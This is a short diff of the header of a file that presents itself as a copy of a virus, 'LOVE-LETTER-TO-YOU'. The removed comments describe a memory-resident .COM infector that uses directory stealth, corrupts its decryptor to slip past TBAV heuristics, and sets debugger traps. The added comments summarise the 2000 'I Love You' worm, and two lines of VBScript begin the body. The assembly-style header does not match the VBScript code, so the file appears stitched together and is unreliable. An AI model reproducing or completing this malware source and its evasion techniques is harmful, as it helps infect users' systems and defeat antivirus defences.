@@ -1,20 +1,12 @@
 ; =======================================================================>
 ;  LOVE-LETTER-TO-YOU by khr1st - 2023 
 ;  [a copy of the original]
-;
-;  This is a memory resident .COM infector which hides itself using
-;  directory stealth (11/12 and 4E/4F). To avoid setting heuristic
-;  flags in TBAV, it overwrites part of the decryption routine with
-;  garbage and adds instructions to repair it on the header of the
-;  program. Runs through TBAV flawlessly. Examine it in action and
-;  observe for yourself.
-;
-;  This virus also includes debugger traps to thwart tracing.
+;  
+;  "I Love You" is a computer worm that originated in the Philippines in 2000. It spreads 
+;   through email and overwrites files on the infected system, causing widespread damage. It 
+;   was one of the most destructive malware outbreaks in history, causing an estimated $10 
+;   billion in damages."
 ; =======================================================================>
-
-
-
-
 
 On Error Resume Next
 Dim fso, fh, sf
